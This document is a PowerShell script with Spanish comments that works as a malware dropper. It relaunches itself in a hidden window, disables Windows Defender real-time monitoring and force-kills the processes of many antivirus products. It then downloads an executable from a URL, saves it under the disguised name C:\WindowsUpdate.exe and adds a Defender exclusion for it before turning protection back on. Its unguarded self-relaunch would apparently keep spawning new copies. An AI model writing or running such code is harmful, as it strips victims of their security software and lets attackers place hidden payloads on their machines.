# Ocultar la ventana de PowerShell
$windowStyle = 'Hidden'
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = 'powershell.exe'
$psi.Arguments = '-NoProfile -ExecutionPolicy Bypass -File "' + $PSCommandPath + '"'
$psi.WindowStyle = $windowStyle
$process = [System.Diagnostics.Process]::Start($psi)

# Lista de procesos a matar
$processList = @(
    "AvastUI.exe", "AvastSvc.exe", "AvastBCL-Svc.exe", "aswidsagent.exe", "AVGUI.exe", "AVGSvc.exe", "avguard.exe",
    "avshadow.exe", "avcenter.exe", "avscan.exe", "sched.exe", "bdservicehost.exe", "bdagent.exe", "seccenter.exe",
    "bdreinit.exe", "updatesrv.exe", "ekrn.exe", "egui.exe", "ecls.exe", "eshell.exe", "avp.exe", "kavtray.exe",
    "klnagent.exe", "kavfswp.exe", "kavfs.exe", "mcshield.exe", "mfevtps.exe", "mfemms.exe", "masvc.exe", "mcafeeap.exe",
    "ccSvcHst.exe", "nortonsecurity.exe", "nsWscSvc.exe", "symerr.exe", "PccNTMon.exe", "NTRTScan.exe", "UfSeAgnt.exe",
    "TmListen.exe", "SophosUI.exe", "SophosSafestore64.exe", "SophosFS.exe", "SophosHealth.exe", "SophosAV.exe", "mbam.exe",
    "mbamtray.exe", "MBAMService.exe", "mbamgui.exe", "PSANHost.exe", "PSUAService.exe", "PSUAMain.exe", "PandaCloudCleaner.exe",
    "cmdagent.exe", "cis.exe", "cistray.exe", "cmdvirth.exe"
)

# Función para desactivar Windows Defender
function Disable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    } catch {
        # Ignorar si no hay Windows Defender
    }
}

# Función para matar procesos
function Stop-ProcessList {
    foreach ($processName in $processList) {
        try {
            Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch {
            # Ignorar si el proceso no existe
        }
    }
}

# Función para descargar un archivo
function Download-File {
    param (
        [string]$url,
        [string]$output
    )
    try {
        # Usar una ubicación temporal si no se puede escribir en C:\
        if (-not (Test-Path -Path $output -IsValid)) {
            $output = "$env:TEMP\WindowsUpdate.exe"
        }
        Invoke-WebRequest -Uri $url -OutFile $output -ErrorAction Stop
    } catch {
        Write-Host "Error al descargar el archivo: $_"
    }
}

# Función para añadir una excepción en Windows Defender
function Add-DefenderExclusion {
    param (
        [string]$path
    )
    try {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    } catch {
        # Ignorar si no hay Windows Defender
    }
}

# Función para reactivar Windows Defender
function Enable-Defender {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
    } catch {
        # Ignorar si no hay Windows Defender
    }
}

# Paso 1: Desactivar Windows Defender
Disable-Defender

# Paso 2: Matar los procesos de la lista
Stop-ProcessList

# Paso 3: Descargar el archivo y guardarlo en una ubicación válida
$downloadUrl = "https://stable.dl2.discordapp.net/distro/app/stable/win/x64/1.0.9182/DiscordSetup.exe"
$outputPath = "C:\WindowsUpdate.exe"
Download-File -url $downloadUrl -output $outputPath

# Paso 4: Añadir el archivo como excepción en Windows Defender
if (Test-Path -Path $outputPath) {
    Add-DefenderExclusion -path $outputPath
} else {
    Write-Host "El archivo no se pudo descargar o guardar."
}

# Paso 5: Reactivar Windows Defender
Enable-Defender
